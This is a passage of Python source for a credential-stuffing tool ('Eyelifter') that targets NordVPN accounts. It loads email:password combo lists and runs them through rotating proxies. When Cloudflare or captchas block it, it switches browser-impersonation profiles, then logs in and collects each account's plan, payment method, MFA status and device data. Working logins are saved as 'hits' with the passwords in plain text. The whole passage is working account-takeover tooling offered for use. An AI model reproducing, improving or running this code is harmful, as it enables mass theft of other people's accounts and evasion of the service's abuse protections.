            cf = Eyelifter_cf_marker(r)
            if cf:
                Eyelifter_debug_step("entry", f"CF {cf} [{self.impersonate}] {url}")
                last_err = "captcha"
                continue
            if r.status_code == 429:
                Eyelifter_debug_step("entry", f"429 [{self.impersonate}]")
                return None, "rate_limit"
            if r.status_code >= 400:
                if last_err != "captcha":
                    last_err = f"http_{r.status_code}"
                Eyelifter_debug_step("entry", f"HTTP {r.status_code} [{self.impersonate}] {url}")
                continue
            Eyelifter_debug_step("entry", f"ok {r.status_code} [{self.impersonate}]")
            return r, None

        if last_err == "captcha":
            tried = {self.impersonate}
            for fallback in IMPERSONATE_POOL:
                if fallback in tried:
                    continue
                tried.add(fallback)
                if len(tried) > 3:
                    break
                try:
                    await self.session.close()
                except Exception:
                    pass
                try:
                    self.session = cffi_requests.AsyncSession(impersonate=fallback)
                except Exception as e:
                    Eyelifter_debug_step("entry", f"skip {fallback}: {str(e)[:50]}")
                    continue

                self.impersonate = fallback
                ua = Eyelifter_shape_ua(fallback)
                self.ua_override = ua
                Eyelifter_debug_step("entry", f"fallback → [{fallback}] {'ua_pinned' if ua else 'profile_ua'}")

                for url in hosts:
                    try:
                        r = await self.session.get(
                            url,
                            headers=self.Eyelifter_doc_headers(referer="https://nordvpn.com/", site="cross-site"),
                            proxies=self.Eyelifter_proxies(),
                            timeout=self.timeout,
                            verify=False,
                            allow_redirects=True,
                        )
                    except Exception:
                        continue
                    cf = Eyelifter_cf_marker(r)
                    if cf:
                        Eyelifter_debug_step("entry", f"CF {cf} [{self.impersonate}] {url}")
                        continue
                    if r.status_code == 200:
                        Eyelifter_debug_step("entry", f"ok 200 [{self.impersonate}] fallback")
                        return r, None

        return None, last_err

    async def Eyelifter_grab_tokens(self, entry_resp):
        url = str(entry_resp.url or "")
        html = entry_resp.text or ""
        self.challenge = Eyelifter_extract_challenge(url, html)
        self.csrf, src = Eyelifter_extract_csrf(self.session, html)
        Eyelifter_debug_step("tokens", f"challenge={(self.challenge or '')[:40]} csrf_src={src}")
        if not self.challenge:
            try:
                r2 = await self.session.get(
                    f"{LOGIN_BASE}/login/identifier",
                    headers=self.Eyelifter_doc_headers(
                        referer=url or f"{LOGIN_BASE}/login",
                        site="same-origin",
                    ),
                    proxies=self.Eyelifter_proxies(),
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
                self.challenge = Eyelifter_extract_challenge(str(r2.url), r2.text or "")
                self.csrf, src = Eyelifter_extract_csrf(self.session, r2.text or "")
                Eyelifter_debug_step("tokens", f"retry challenge={(self.challenge or '')[:40]} csrf_src={src}")
            except Exception:
                pass
        if not self.challenge:
            return "no_challenge"
        if not self.csrf:
            return "no_csrf"
        return None

    async def Eyelifter_post_email(self, email):
        for field in ("identifier", "email"):
            csrf, _ = Eyelifter_extract_csrf(self.session)
            if not csrf:
                try:
                    r0 = await self.session.get(
                        f"{LOGIN_BASE}/login/identifier?challenge={self.challenge}",
                        headers=self.Eyelifter_doc_headers(
                            referer=f"{LOGIN_BASE}/login",
                            site="same-origin",
                        ),
                        proxies=self.Eyelifter_proxies(),
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True,
                    )
                    csrf, _ = Eyelifter_extract_csrf(self.session, r0.text or "")
                except Exception:
                    pass
            if not csrf:
                return None, "no_csrf"
            self.csrf = csrf
            try:
                r = await self.session.post(
                    f"{LOGIN_BASE}/login/identifier?challenge={self.challenge}",
                    data={field: email, "_csrf": csrf},
                    headers=self.Eyelifter_doc_headers(
                        referer=f"{LOGIN_BASE}/login/identifier?challenge={self.challenge}",
                        origin=LOGIN_BASE,
                        site="same-origin",
                        extra={"content-type": "application/x-www-form-urlencoded"},
                    ),
                    proxies=self.Eyelifter_proxies(),
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
            except Exception as e:
                msg = str(e).lower()
                if "timeout" in msg:
                    return None, "timeout"
                if "proxy" in msg:
                    return None, "proxy"
                return None, "network"
            cf = Eyelifter_cf_marker(r)
            if cf:
                Eyelifter_debug_step("email", f"CF {cf} field={field}")
                return None, "captcha"
            if r.status_code == 429:
                return None, "rate_limit"
            url = str(r.url or "")
            low = (r.text or "").lower()
            Eyelifter_debug_step("email", f"field={field} status={r.status_code} url={url[:80]}")
            if "/login/password" in url:
                return r, None
            if "incorrect" in low or "invalid email" in low or "not found" in low:
                return None, "identifier_rejected"
            continue
        return None, "email_step_failed"

    async def Eyelifter_post_pass(self, password):
        html = ""
        try:
            r_pw = await self.session.get(
                f"{LOGIN_BASE}/login/password?challenge={self.challenge}",
                headers=self.Eyelifter_doc_headers(
                    referer=f"{LOGIN_BASE}/login/identifier?challenge={self.challenge}",
                    site="same-origin",
                ),
                proxies=self.Eyelifter_proxies(),
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            html = r_pw.text or ""
        except Exception:
            pass
        csrf2, _ = Eyelifter_extract_csrf(self.session, html)
        if not csrf2:
            return None, "no_csrf_pw"
        self.csrf = csrf2
        try:
            r = await self.session.post(
                f"{LOGIN_BASE}/login/password?challenge={self.challenge}",
                data={"password": password, "_csrf": csrf2},
                headers=self.Eyelifter_doc_headers(
                    referer=f"{LOGIN_BASE}/login/password?challenge={self.challenge}",
                    origin=LOGIN_BASE,
                    site="same-origin",
                    extra={"content-type": "application/x-www-form-urlencoded"},
                ),
                proxies=self.Eyelifter_proxies(),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False,
            )
        except Exception as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return None, "timeout"
            if "proxy" in msg:
                return None, "proxy"
            return None, "network"
        cf = Eyelifter_cf_marker(r)
        if cf:
            Eyelifter_debug_step("password", f"CF {cf}")
            return None, "captcha"
        if r.status_code == 429:
            return None, "rate_limit"

        low = (r.text or "").lower()
        lock_markers = (
            "account locked",
            "locked for security reasons",
            "how to unlock",
            "reset your password or use another way",
        )
        if any(m in low for m in lock_markers):
            Eyelifter_debug_step("password", f"LOCKED [{self.impersonate}]")
            return None, "locked"

        if r.status_code == 400:
            if any(x in low for x in ("invalid", "incorrect", "wrong", "incorrect password")):
                Eyelifter_debug_step("password", f"400 bad creds [{self.impersonate}]")
                return None, "creds"
            return None, "http_400"
        Eyelifter_debug_step("password", f"status={r.status_code} loc={r.headers.get('Location','')[:80]}")
        return r, None

    async def Eyelifter_walk_oauth(self, start_url, max_hops=8):
        url = start_url
        for _ in range(max_hops):
            if not url:
                break
            try:
                r = await self.session.get(
                    url,
                    headers=self.Eyelifter_doc_headers(site="same-site"),
                    proxies=self.Eyelifter_proxies(),
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False,
                )
            except Exception:
                return False
            if r.status_code not in (301, 302, 303, 307, 308):
                return True
            nxt = r.headers.get("Location", "")
            base = "https://" + url.split("/")[2] if "://" in url else ACCOUNT_BASE
            url = Eyelifter_resolve(base, nxt)
        return True

    async def Eyelifter_pull(self, path):
        try:
            r = await self.session.get(
                f"{ACCOUNT_BASE}{path}",
                headers=self.Eyelifter_api_headers(
                    extra={"x-csrf-token": self.session.cookies.get("csrf") or ""}
                ),
                proxies=self.Eyelifter_proxies(),
                timeout=self.timeout,
                verify=False,
            )
        except Exception as e:
            Eyelifter_debug_api(path, "EXC", str(e)[:200])
            return None
        if r.status_code != 200:
            Eyelifter_debug_api(path, r.status_code, (r.text or "")[:300])
            return None
        try:
            j = r.json()
        except Exception:
            Eyelifter_debug_api(path, "NON-JSON", (r.text or "")[:300])
            return None
        Eyelifter_debug_api(path, 200, j)
        return j

    async def Eyelifter_shape(self, email):
        u, subs, merchant, mfa, mesh, dwm = await asyncio.gather(
            self.Eyelifter_pull("/api/v1/users/details"),
            self.Eyelifter_pull("/api/v1/subscriptions"),
            self.Eyelifter_pull("/api/v1/users/services/merchants/nordvpn"),
            self.Eyelifter_pull("/api/v1/users/details/mfa-status"),
            self.Eyelifter_pull("/api/v1/meshnet/machines"),
            self.Eyelifter_pull("/api/v2/dwm/breaches"),
        )
        u = u or {}
        subs = subs or []
        merchant = merchant or []
        mfa = mfa or {}
        mesh = mesh or []
        dwm = dwm or []

        if isinstance(subs, dict):
            subs = subs.get("subscriptions") or subs.get("data") or []

        email_out = u.get("email") or email
        uid = (u.get("id") or u.get("userId") or u.get("uuid")
               or (u.get("alternateIds") or {}).get("NBACIAMGUID") or "N/A")
        country = u.get("country") or u.get("countryCode") or "N/A"

        mfa_state = "N/A"
        if isinstance(mfa, dict):
            st = mfa.get("mfa_status") or mfa.get("enabled")
            if st in (True, "enabled", "on"):
                mfa_state = "Yes"
            elif st in (False, "disabled", "off"):
                mfa_state = "No"

        plan = "Free"
        status = "N/A"
        expiry = "N/A"
        price = "-"
        currency = "USD"
        is_paid = False
        pay = "N/A"
        services_list = []
        expires_at = None

        if isinstance(merchant, list) and merchant:
            first = merchant[0]
            if isinstance(first, dict):
                expires_at = first.get("expires_at")
                if first.get("active"):
                    is_paid = True
                extra = first.get("extra_details") or {}
                if isinstance(extra, dict):
                    if pay == "N/A":
                        pay = (extra.get("payment_method")
                               or extra.get("paymentMethod") or pay)
            services_list = sorted({
                m.get("identifier") or m.get("product_identifier")
                for m in merchant if isinstance(m, dict)
            } - {None})

        if isinstance(subs, list) and subs:
            best = subs[0]
            if isinstance(best, dict):
                plan_display = None
                plans_arr = best.get("plans") or []
                if isinstance(plans_arr, list) and plans_arr:
                    plan_display = (plans_arr[0].get("display_title")
                                    if isinstance(plans_arr[0], dict) else None)

                plan = (plan_display or best.get("planName") or best.get("name")
                        or best.get("productName") or best.get("plan") or "Paid")

                status = best.get("status") or best.get("state") or "N/A"

                exp_raw = (best.get("expiresAt") or best.get("expires")
                           or best.get("validUntil") or best.get("next_payment_at"))
                if exp_raw:
                    expiry = Eyelifter_human_str(exp_raw)

                amt = best.get("amount")
                cur = best.get("currency")
                if cur:
                    currency = cur
                if amt is not None:
                    price = f"{currency} {amt}"

                if pay == "N/A":
                    prov = (best.get("provider_name")
                            or best.get("provider")
                            or best.get("merchant"))
                    if prov:
                        pay = prov

                if country == "N/A":
                    payer = best.get("payer") or {}
                    if isinstance(payer, dict):
                        country = payer.get("country") or country
                    if country == "N/A":
                        country = best.get("orderCountry") or country

                st_low = str(status).lower()
                if st_low in ("active", "trial", "trialist", "in grace", "grace"):
                    is_paid = True

        if expires_at and expiry == "N/A":
            expiry = Eyelifter_human_str(expires_at)

        if is_paid and plan == "Free":
            plan = "NordVPN"

        days_left = Eyelifter_days_from_str(expiry)

        return {
            "email": email_out,
            "user_id": uid,
            "country": country,
            "plan": plan,
            "status": status,
            "expiry": expiry,
            "days_left": days_left,
            "price": price,
            "currency": currency,
            "payment_method": pay,
            "is_paid": is_paid,
            "mfa": mfa_state,
            "meshnet_count": len(mesh) if isinstance(mesh, list) else "N/A",
            "breaches": len(dwm) if isinstance(dwm, list) else "N/A",
            "services": ",".join(services_list) if services_list else "N/A",
        }

    async def Eyelifter_run(self, email, password):
        await self.Eyelifter_ensure()
        try:
            entry_resp, err = await self.Eyelifter_entry()
            if err:
                return {"status": "error", "error_type": err, "message": f"entry:{err}"}

            tok_err = await self.Eyelifter_grab_tokens(entry_resp)
            if tok_err:
                return {"status": "error", "error_type": tok_err, "message": f"tokens:{tok_err}"}

            mail_resp, err = await self.Eyelifter_post_email(email)
            if err == "identifier_rejected":
                return {"status": "bad", "error_type": "creds",
                        "message": "invalid email or password"}
            if err:
                return {"status": "error", "error_type": err, "message": f"email:{err}"}

            pass_resp, err = await self.Eyelifter_post_pass(password)
            if err == "creds":
                return {"status": "bad", "error_type": "creds",
                        "message": "invalid credentials"}
            if err == "locked":
                return {"status": "locked", "error_type": None,
                        "message": "account locked for security reasons"}
            if err:
                return {"status": "error", "error_type": err, "message": f"pass:{err}"}

            if pass_resp.status_code in (301, 302, 303, 307, 308):
                loc = pass_resp.headers.get("Location", "") or ""
                if "login" in loc.lower() and "password" not in loc.lower():
                    return {"status": "bad", "error_type": "creds",
                            "message": "invalid credentials"}
                next_url = Eyelifter_resolve(LOGIN_BASE, loc)
                if next_url:
                    await self.Eyelifter_walk_oauth(next_url)
            elif pass_resp.status_code == 200:
                low = (pass_resp.text or "").lower()
                if "incorrect" in low or "wrong password" in low or "invalid" in low:
                    return {"status": "bad", "error_type": "creds",
                            "message": "invalid credentials"}
            else:
                return {"status": "error", "error_type": f"http_{pass_resp.status_code}",
                        "message": f"password step {pass_resp.status_code}"}

            shaped = await self.Eyelifter_shape(email)
            if not shaped.get("user_id") or shaped.get("user_id") == "N/A":
                probe = await self.Eyelifter_pull("/api/v1/users/details")
                if not probe:
                    return {"status": "error", "error_type": "no_session",
                            "message": "auth chain didn't land session cookie"}

            return {"status": "valid", "error_type": None,
                    "message": "login OK", "user": shaped}
        finally:
            await self.Eyelifter_close()


def Eyelifter_format_hit(email, password, u):
    def Eyelifter_s(v):
        if v is None or v == "":
            return "-"
        return str(v)
    prefix = "✅ HIT" if u.get("is_paid") else "🆓 FREE"
    return (
        f"{prefix} {email}:{password} | "
        f"Plan:{Eyelifter_s(u.get('plan'))} | "
        f"Status:{Eyelifter_s(u.get('status'))} | "
        f"Expiry:{Eyelifter_s(u.get('expiry'))} | "
        f"Days:{Eyelifter_s(u.get('days_left'))} | "
        f"Price:{Eyelifter_s(u.get('price'))} | "
        f"Pay:{Eyelifter_s(u.get('payment_method'))} | "
        f"Country:{Eyelifter_s(u.get('country'))} | "
        f"MFA:{Eyelifter_s(u.get('mfa'))} | "
        f"Meshnet:{Eyelifter_s(u.get('meshnet_count'))} | "
        f"Breaches:{Eyelifter_s(u.get('breaches'))} | "
        f"Services:{Eyelifter_s(u.get('services'))} | "
        f"UID:{Eyelifter_s(u.get('user_id'))} | "
        f"by {AUTHOR_TAG}"
    )


async def Eyelifter_run_single_with_retries(email, password, proxy):
    checker = EyelifterNord(proxy=proxy)
    max_attempts = CONFIG.get("retries", 3) + 1
    rate_limit_hits = 0
    captcha_attempts = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
        if Eyelifter_stop_event.is_set():
            break
        if attempt > 0:
            checker = EyelifterNord(proxy=proxy)
            new_proxy = Eyelifter_pick_proxy(exclude=last_proxy)
            if new_proxy:
                proxy = new_proxy
                checker.proxy = proxy
        else:
            if proxy and proxy in Eyelifter_bad_proxies:
                proxy = Eyelifter_pick_proxy()
                checker.proxy = proxy
        last_proxy = proxy

        try:
            result = await checker.Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash", "message": str(e)[:120]}

        status = result.get("status", "unknown")
        err_type = result.get("error_type", "")

        if status in ("valid", "bad", "locked") or err_type == "creds":
            break

        if err_type == "captcha":
            with Eyelifter_stats_lock:
                Eyelifter_stats["captcha"] += 1
                Eyelifter_stats["retries"] += 1
            captcha_attempts += 1
            if captcha_attempts >= 2 or attempt >= max_attempts - 1:
                break
            await asyncio.sleep(0.3)
            continue

        if err_type == "rate_limit":
            with Eyelifter_stats_lock:
                Eyelifter_stats["rate_limited"] += 1
                Eyelifter_stats["retries"] += 1
            rate_limit_hits += 1
            if rate_limit_hits > MAX_RATE_LIMIT_RETRIES:
                break
            backoff = RATE_LIMIT_BACKOFF * (2 ** (rate_limit_hits - 1))
            await asyncio.sleep(backoff)
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if err_type == "block":
            with Eyelifter_stats_lock:
                Eyelifter_stats["blocks"] += 1
                Eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(BLOCK_BACKOFF)
            continue

        if (err_type in ("proxy", "timeout", "network", "no_session",
                         "no_challenge", "no_csrf", "no_csrf_pw",
                         "email_step_failed") or
                err_type.startswith("network:") or err_type.startswith("http_")):
            with Eyelifter_stats_lock:
                Eyelifter_stats["retries"] += 1
            if err_type in ("proxy", "timeout", "network") or err_type.startswith("network:"):
                if proxy:
                    Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 2))
            continue

        await asyncio.sleep(CONFIG.get("retry_delay", 2))

    return result or {"status": "error", "error_type": "no_result", "message": "no result"}


def Eyelifter_record_result(email, password, result):
    global Eyelifter_hits_file, Eyelifter_free_file, Eyelifter_locked_file, Eyelifter_errors_file
    with Eyelifter_stats_lock:
        Eyelifter_stats["checked"] += 1
        checked = Eyelifter_stats["checked"]
    total = Eyelifter_total_combos
    status = result.get("status", "unknown")

    if status == "valid":
        u = result.get("user", {}) or {}
        line = Eyelifter_format_hit(email, password, u)
        if u.get("is_paid"):
            with Eyelifter_stats_lock:
                Eyelifter_stats["hits"] += 1
            print(f"[{checked}/{total}] {line}")
            if Eyelifter_hits_file:
                Eyelifter_hits_file.write(line + "\n\n")
                Eyelifter_hits_file.flush()
        else:
            with Eyelifter_stats_lock:
                Eyelifter_stats["free"] += 1
            print(f"[{checked}/{total}] {line}")
            if Eyelifter_free_file:
                Eyelifter_free_file.write(line + "\n\n")
                Eyelifter_free_file.flush()
    elif status == "bad":
        with Eyelifter_stats_lock:
            Eyelifter_stats["bad"] += 1
        msg = result.get("message", "invalid credentials")
        print(f"[{checked}/{total}] {email} - ❌ bad: {msg}")
    elif status == "locked":
        with Eyelifter_stats_lock:
            Eyelifter_stats["locked"] += 1
        line = f"🔒 LOCKED {email}:{password} | account locked for security reasons | by {AUTHOR_TAG}"
        print(f"[{checked}/{total}] {line}")
        if Eyelifter_locked_file:
            Eyelifter_locked_file.write(line + "\n\n")
            Eyelifter_locked_file.flush()
    else:
        with Eyelifter_stats_lock:
            Eyelifter_stats["errors"] += 1
        err_type = result.get("error_type", "")
        msg = result.get("message", "unknown error")
        tag = f"[{err_type}]" if err_type else ""
        line = f"⚠️ ERROR {email}:{password} | {err_type or 'error'} | {msg}"
        print(f"[{checked}/{total}] {email} - ⚠️ Error {tag}: {msg}")
        if Eyelifter_errors_file:
            Eyelifter_errors_file.write(line + "\n\n")
            Eyelifter_errors_file.flush()
    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    sem = asyncio.Semaphore(CONFIG["threads"])
    lock = asyncio.Lock()

    async def _one(combo):
        if Eyelifter_stop_event.is_set():
            return
        if ":" not in combo:
            return
        parts = combo.split(":", 1)
        if len(parts) != 2:
            return
        email, password = parts[0].strip().lower(), parts[1].strip()
        if not email or not password or "@" not in email:
            return

        async with sem:
            if Eyelifter_stop_event.is_set():
                return
            proxy = Eyelifter_pick_proxy()
            result = await Eyelifter_run_single_with_retries(email, password, proxy)
            async with lock:
                Eyelifter_record_result(email, password, result)
            delay = CONFIG.get("combo_delay", 0.2)
            if delay > 0:
                await asyncio.sleep(delay)

    tasks = [asyncio.create_task(_one(c)) for c in combos]
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            t.cancel()
        raise


async def Eyelifter_filter_and_run(proxies, combos):
    global Eyelifter_proxy_pool, Eyelifter_bad_proxies
    working = Eyelifter_get_working_proxies(proxies) if proxies else []
    Eyelifter_proxy_pool = working
    Eyelifter_bad_proxies = set()

    Eyelifter_log("🔄", "INFO", "UA", "probing shapes across multiple proxies...")
    n = Eyelifter_refresh_shapes_multi(working, attempts=4, quiet=True)
    Eyelifter_log("✅", "INFO", "UA", f"{n} working shapes active")

    await Eyelifter_bulk_runner(combos)


def Eyelifter_single_check(proxies):
    Eyelifter_section("SINGLE CHECK")

    probe_pool = Eyelifter_proxy_pool if Eyelifter_proxy_pool else proxies
    Eyelifter_log("🔄", "INFO", "UA", "probing shapes across multiple proxies...")
    n = Eyelifter_refresh_shapes_multi(probe_pool, attempts=3, quiet=True)
    Eyelifter_log("✅", "INFO", "UA", f"{n} working shapes active")

    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format. use email:password")
        return

    proxy = Eyelifter_pick_proxy() if Eyelifter_proxy_pool else (random.choice(proxies) if proxies else None)
    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    email, password = combo.split(":", 1)
    result = asyncio.run(Eyelifter_run_single_with_retries(email.strip(), password.strip(), proxy))
    elapsed = time.time() - start

    if result and result.get("status") == "valid":
        u = result.get("user", {}) or {}
        verdict = "✅ SUBSCRIBER" if u.get("is_paid") else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", email.strip()),
            ("Password", password.strip()),
            ("Plan", u.get("plan", "-")),
            ("Sub Status", u.get("status", "-")),
            ("Expiry", u.get("expiry", "-")),
            ("Days Left", u.get("days_left", "-")),
            ("Price", u.get("price", "-")),
            ("Payment", u.get("payment_method", "-")),
            ("Country", u.get("country", "-")),
            ("MFA", u.get("mfa", "-")),
            ("Meshnet Devices", u.get("meshnet_count", "-")),
            ("Breaches", u.get("breaches", "-")),
            ("Services", u.get("services", "-")),
            ("User ID", u.get("user_id", "-")),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        print()
        Eyelifter_summary(rows)
    elif result and result.get("status") == "locked":
        print()
        Eyelifter_summary([
            ("Status", "🔒 LOCKED"),
            ("Email", email.strip()),
            ("Password", password.strip()),
            ("Reason", "account locked for security reasons"),
            ("Checked By", AUTHOR_TAG),
        ])
    else:
        status = result.get("status", "Unknown") if result else "no response"
        err_type = result.get("error_type", "") if result else ""
        msg = result.get("message", "no details") if result else "all retries exhausted"
        tag = f"[{err_type}]" if err_type else ""
        Eyelifter_log("❌", "ERROR", "RESULT", f"{status} {tag} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Press Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    global Eyelifter_total_combos, Eyelifter_hits_file, Eyelifter_free_file
    global Eyelifter_locked_file, Eyelifter_errors_file, Eyelifter_session_folder
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    filepath = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not filepath or not os.path.isfile(filepath):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        return

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos_set = Eyelifter_extract_combos(content)
    if not combos_set:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos found in the file.")
        return

    combos = sorted(combos_set)
    Eyelifter_log("✅", "INFO", "EXTRACT", f"extracted {len(combos)} unique combos.")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    Eyelifter_session_folder = os.path.join(RESULTS_FOLDER, f"Session_{timestamp}")
    os.makedirs(Eyelifter_session_folder, exist_ok=True)

    hits_path = os.path.join(Eyelifter_session_folder, "nordvpn_hits.txt")
    free_path = os.path.join(Eyelifter_session_folder, "nordvpn_free.txt")
    locked_path = os.path.join(Eyelifter_session_folder, "nordvpn_locked.txt")
    errors_path = os.path.join(Eyelifter_session_folder, "nordvpn_errors.txt")
    Eyelifter_hits_file = open(hits_path, "w", encoding="utf-8")
    Eyelifter_free_file = open(free_path, "w", encoding="utf-8")
    Eyelifter_locked_file = open(locked_path, "w", encoding="utf-8")
    Eyelifter_errors_file = open(errors_path, "w", encoding="utf-8")

    header = (f"# NordVPN Checker Results - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    Eyelifter_hits_file.write(header)
    Eyelifter_free_file.write(header)
    Eyelifter_locked_file.write(header)
    Eyelifter_errors_file.write(header)

    Eyelifter_total_combos = len(combos)

    Eyelifter_log("📊", "INFO", "FILE", f"loaded {Eyelifter_total_combos} combos")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads: {CONFIG['threads']} | timeout: {CONFIG['timeout']}s | "
                  f"retries: {CONFIG['retries']} | combo delay: {CONFIG['combo_delay']}s | "
                  f"debug: {CONFIG['debug']}")

    Eyelifter_stop_event.clear()
    try:
        asyncio.run(Eyelifter_filter_and_run(proxies, combos))
    except KeyboardInterrupt:
        Eyelifter_stop_event.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")

    Eyelifter_hits_file.close()
    Eyelifter_free_file.close()
    Eyelifter_locked_file.close()
    Eyelifter_errors_file.close()

    old_hits = os.path.join(Eyelifter_session_folder, "nordvpn_hits.txt")
    new_hits = os.path.join(Eyelifter_session_folder, f"nordvpn_hits_{Eyelifter_stats['hits']}.txt")
    if os.path.exists(old_hits):
        os.rename(old_hits, new_hits)

    old_free = os.path.join(Eyelifter_session_folder, "nordvpn_free.txt")
    new_free = os.path.join(Eyelifter_session_folder, f"nordvpn_free_{Eyelifter_stats['free']}.txt")
    if os.path.exists(old_free):
        os.rename(old_free, new_free)

    old_locked = os.path.join(Eyelifter_session_folder, "nordvpn_locked.txt")
    new_locked = os.path.join(Eyelifter_session_folder, f"nordvpn_locked_{Eyelifter_stats['locked']}.txt")
    if os.path.exists(old_locked):
        os.rename(old_locked, new_locked)

    old_errors = os.path.join(Eyelifter_session_folder, "nordvpn_errors.txt")
    new_errors = os.path.join(Eyelifter_session_folder, f"nordvpn_errors_{Eyelifter_stats['errors']}.txt")
    if os.path.exists(old_errors):
        os.rename(old_errors, new_errors)

    Eyelifter_log("💾", "INFO", "SAVE", f"results saved to {Eyelifter_session_folder}")

    Eyelifter_divider()
    elapsed = time.time() - Eyelifter_start_time
    Eyelifter_summary([
        ("Total", Eyelifter_total_combos),
        ("Hits (paid)", Eyelifter_stats["hits"]),
        ("Free accounts", Eyelifter_stats["free"]),
        ("Bad", Eyelifter_stats["bad"]),
        ("Locked", Eyelifter_stats["locked"]),
        ("Errors", Eyelifter_stats["errors"]),
        ("Rate Limited", Eyelifter_stats["rate_limited"]),
        ("Captcha Blocks", Eyelifter_stats["captcha"]),
        ("Blocks", Eyelifter_stats["blocks"]),
        ("Proxy Fails", Eyelifter_stats["proxy_fails"]),
        ("Retries", Eyelifter_stats["retries"]),
        ("Time", f"{elapsed:.1f}s"),
        ("Folder", Eyelifter_session_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Press Enter to continue...')}")


def Eyelifter_ua_checker():
    Eyelifter_section("UA CHECKER")
    proxy = None
    if Eyelifter_proxy_pool:
        proxy = Eyelifter_pick_proxy()
    Eyelifter_log("🌐", "INFO", "UA", f"probe via {proxy or 'direct'}")
    n = Eyelifter_refresh_shapes(proxy=proxy, quiet=False)
    print()
    if n == 0:
        Eyelifter_log("❌", "ERROR", "UA", "no working shapes — IP is hot or CF strict")
    else:
        Eyelifter_log("✅", "INFO", "UA", f"{n} shapes ready, saved to config")
    input(f"{Eyelifter_color('93', '[*] Press Enter to continue...')}")


def Eyelifter_settings_menu():
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, BLOCK_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current Settings:"))
    print(f"  Threads: {CONFIG['threads']} (1-50)")
    print(f"  Timeout: {CONFIG['timeout']}s")
    print(f"  Retries: {CONFIG['retries']}")
    print(f"  Retry Delay: {CONFIG['retry_delay']}s")
    print(f"  Combo Delay: {CONFIG['combo_delay']}s")
    print(f"  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  Block Backoff: {CONFIG['block_backoff']}s")
    print(f"  Proxy File: {CONFIG['proxies_file']}")
    print(f"  Debug: {CONFIG['debug']}")
    print(f"  Active shapes: {len(IMPERSONATE_POOL)}")
    print(f"  Last refresh: {CONFIG.get('last_refresh') or 'never'}")
    print()
    print(Eyelifter_color("93", "[1] Change Threads (1-50)"))
    print(Eyelifter_color("93", "[2] Change Timeout"))
    print(Eyelifter_color("93", "[3] Change Retries"))
    print(Eyelifter_color("93", "[4] Change Retry Delay"))
    print(Eyelifter_color("93", "[5] Change Combo Delay"))
    print(Eyelifter_color("93", "[6] Toggle Debug"))
    print(Eyelifter_color("93", "[7] Back"))

    choice = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    if choice == "1":
        try:
            val = int(input("Threads (1-50): "))
            CONFIG["threads"] = max(1, min(50, val))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
            Eyelifter_log("✅", "INFO", "CONFIG", f"threads set to {CONFIG['threads']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "2":
        try:
            val = int(input("Timeout (5-60): "))
            CONFIG["timeout"] = max(5, min(60, val))
            _loader.settings["timeout"] = CONFIG["timeout"]
            changed = True
            Eyelifter_log("✅", "INFO", "CONFIG", f"timeout set to {CONFIG['timeout']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "3":
        try:
            val = int(input("Retries (0-5): "))
            CONFIG["retries"] = max(0, min(5, val))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
            Eyelifter_log("✅", "INFO", "CONFIG", f"retries set to {CONFIG['retries']}")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "4":
        try:
            val = float(input("Retry delay (seconds): "))
            CONFIG["retry_delay"] = max(0, val)
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
            Eyelifter_log("✅", "INFO", "CONFIG", f"retry delay set to {CONFIG['retry_delay']}s")
        except Exception:
            Eyelifter_log("❌", "ERROR", "CONFIG", "invalid value")
    elif choice == "5":
        try:
            val = float(input("Combo delay (seconds): "))
            CONFIG["combo_delay"] = max(0, val)
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
